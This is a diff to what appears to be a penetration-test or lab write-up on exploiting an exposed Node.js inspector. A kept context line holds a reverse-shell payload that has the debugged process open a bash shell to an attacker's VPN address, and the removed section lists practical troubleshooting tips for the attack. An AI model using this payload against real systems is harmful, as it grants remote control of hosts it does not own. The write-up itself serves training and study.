@@ -187,18 +187,6 @@ For anything beyond a one-off command, it's less painful to open a full reverse 
 process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/<VPN_IP>/4444 0>&1"')
 ```
 
-### 5.5 Things that cost time along the way
-
-A few gotchas worth flagging for anyone trying this themselves:
-
-- **"SSH just hangs"** — that's the `-N` flag working as intended; no prompt is ever coming, so just use the second terminal.
-- **`~C` prints literally instead of opening SSH's own command line** — that escape sequence only works as the very first characters typed right after pressing Enter on a fresh line.
-- **The WebSocket address looks cut off when copied by eye from the terminal** — it's just line-wrapping; extract it with `jq` instead of reading it off the screen.
-- **The address changes** every time the debugged process restarts — re-fetch `/json` rather than reusing an old one.
-- **Connected, but no reply to `Runtime.evaluate`** — the process was probably started with `--inspect-brk`, which pauses it at the very first line of code; send `{"id":0,"method":"Debugger.resume"}` first to let it continue.
-- **Connection immediately rejected** — Node's inspector only allows one debugger client at a time; make sure nothing else (like an open `chrome://inspect` tab) is still attached.
-- **`curl --ws` doesn't work here** — the Debian-packaged build of curl doesn't include WebSocket support; don't waste time chasing that.
-
 ---
 
 ## 6. Attack Chain Summary
